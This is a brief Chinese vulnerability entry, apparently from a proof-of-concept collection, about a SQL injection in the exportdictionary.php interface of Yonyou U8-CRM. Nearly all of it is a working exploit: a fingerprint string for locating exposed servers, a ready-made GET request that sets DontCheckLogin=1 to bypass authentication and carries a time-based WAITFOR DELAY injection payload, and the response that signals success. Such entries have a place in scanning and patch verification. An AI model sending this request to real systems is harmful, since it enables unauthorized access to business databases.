# 用友U8-CRM接口exportdictionary.php存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`body="/js/tfunction.js"`
- **请求**：`GET /devtools/tools/exportdictionary.php?DontCheckLogin=1&value=1%27;WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1`
- **响应特征**：200